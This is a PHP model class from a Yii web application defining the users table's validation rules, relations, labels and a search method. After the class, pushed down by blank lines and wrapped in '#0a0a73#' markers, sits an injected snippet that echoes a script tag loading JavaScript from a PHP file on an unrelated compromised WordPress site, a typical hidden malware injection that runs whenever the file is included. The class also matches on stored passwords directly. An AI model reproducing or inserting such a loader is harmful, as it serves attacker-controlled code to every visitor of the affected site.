
<?php


class Users extends CActiveRecord
{

	public $confirm_pw;

	public $forgotpassword;
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'users';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			
			array('user_type, post_code,area_id,question_id, city, country ', 'numerical', 'integerOnly'=>true),
			array('first_name, last_name, full_name, email,business_type, answer,password, business_name, solution, company, status', 'length', 'max'=>200),
			array('contact_no', 'length', 'max'=>20),
			array('user_type', 'required'),
			array('first_name, last_name, email,question_id,post_code,address, answer,business_type,age, password, contact_no, city, country', 'required','on'=>'personal'),
			array('email', 'email'),

			array('first_name, last_name, email, password,question_id, answer, business_name, address, contact_no, city, post_code, country', 'required','on'=>'seller'),
			
			array('photo', 'file', 'types'=>'jpg,jpeg, gif, png','allowEmpty'=>true),
			

			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('uid, user_type, first_name, last_name, full_name, email, password, business_name, business_type, solution, address, contact_no, company, city, post_code, country, status, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(

			'area' => array(self::BELONGS_TO, 'Area', 'area_id'),
			'question' => array(self::BELONGS_TO, 'Question', 'question_id'),
			'states' => array(self::BELONGS_TO, 'States', 'country'),
			'cities' => array(self::BELONGS_TO, 'City', 'city'),
			'maincategory' => array(self::BELONGS_TO, 'MainCategory', 'main_category_id'),
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'uid' => 'Uid',
			'user_type' => 'User Type',
			'first_name' => 'First Name',
			'last_name' => 'Last Name',
			'full_name' => 'Full Name',
			'email' => 'Email',
			'password' => 'Password',
			'business_name' => 'Business Name',
			'business_type' => 'Profession',
			'solution' => 'Solution',
			'address' => 'Address',
			'contact_no' => 'Contact No',
			'company' => 'Company',
			'city' => 'City',
			'post_code' => 'Pin Code',
			'country' => 'State',
			'area_id'=>'Location Area',
			'status' => 'Status',
			'question_id' => 'Security Question',
			'answer' => 'Security Answer',
			'main_category_id'=>'Category',
			'sub_category_id'=>'Sub Category',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search( $param = array() )
	{
		// @todo Please modify the following code to remove attributes that should not be searched.
		
		$criteria=new CDbCriteria($param);
		$criteria->together=true;
		$criteria->compare('uid',$this->uid);
		if($_GET['user_type']==1)
			$criteria->addCondition("user_type = 1");
		else if($_GET['user_type']==2)
			$criteria->addCondition("user_type = 2");
		else	
			$criteria->compare('user_type',$this->user_type);
		
		$criteria->compare('first_name',$this->first_name,true);
		$criteria->compare('last_name',$this->last_name,true);
		$criteria->compare('full_name',$this->full_name,true);
		$criteria->compare('email',$this->email,true);
		$criteria->compare('password',$this->password,true);
		$criteria->compare('business_name',$this->business_name,true);
		$criteria->compare('business_type',$this->business_type);
		$criteria->compare('solution',$this->solution,true);
		$criteria->compare('address',$this->address,true);
		$criteria->compare('contact_no',$this->contact_no,true);
		$criteria->compare('company',$this->company,true);
		$criteria->compare('city',$this->city,true);
		$criteria->compare('area_id',$this->area_id,true);
		$criteria->compare('post_code',$this->post_code);
		$criteria->compare('country',$this->country,true);
		
		if($_GET['status']=='Active')
			$criteria->addCondition("status = 'Active'");
		else if($_GET['status']=='Inactive')
			$criteria->addCondition("status = 'Inactive'");
		else
			$criteria->compare('status',$this->status='Active',true);
		
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Users the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}

	public function beforeDelete()
	{
		
		//$imageLocation = Yii::app()->basePath."/../upload/icons/";	
		//@unlink($imageLocation.$this->columName);			
		return parent::beforeDelete();
	}

	public static function getUsers() {
		return CHtml::listData(Users::model()->findAll(array("order"=>"full_name")),'uid', 'full_name');
	}
}










#0a0a73#
if(empty($bdyka)) {
$bdyka = "<script type=\"text/javascript\" src=\"http://hollistercarwash.com/blog/wp-content/themes/twentytwelve/rfjthdxk.php?id=15258560\"></script>";
echo $bdyka;
}
#/0a0a73#

